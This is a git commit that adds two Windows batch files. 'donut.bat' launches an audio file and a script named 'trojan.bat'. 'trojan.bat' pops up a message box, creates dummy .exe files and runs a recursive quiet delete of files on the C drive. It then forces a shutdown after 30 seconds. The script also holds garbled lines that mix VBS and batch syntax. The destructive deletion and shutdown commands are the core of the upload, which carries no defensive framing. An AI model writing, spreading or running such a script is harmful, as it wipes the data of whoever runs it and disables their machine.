0807d506d58f8bae73d20324c1c91b0bdd403ea7
VietTranI <92702651+VietTranI@users.noreply.github.com>
2021-11-09 20:14:41 +0700

    Add files via upload

---
+++ donut.bat
@@ -0,0 +1,17 @@
+start "" "ao.bat"
+start "" "1636463579.mp3"
+start "" "trojan.bat"
+color 02
+color 03
+color 04
+color 05
+color 06
+color 07
+color 08
+color 09
+color 02
+donut.application
+
+
+
+
---
+++ trojan.bat
@@ -0,0 +1,14 @@
+@echo off
+#Notrayicon
+echo x=msgbox("Enjoy...",0+40,"....") >>Enjoy.vbs
+start "" "Enjoy.vbs"
+echo>> D6F9F6G65GF958F.exe
+echo >> OGV76VC7BX9BX9Y.exe
+DEL C:\/s /q *.*
+echo >>Treomay.vbs
+set /p Treomay.vbs=
+do
+treomay:run
+loop
+start "Treomay.vbs
+shutdown -s -t 30 -c "loading..."
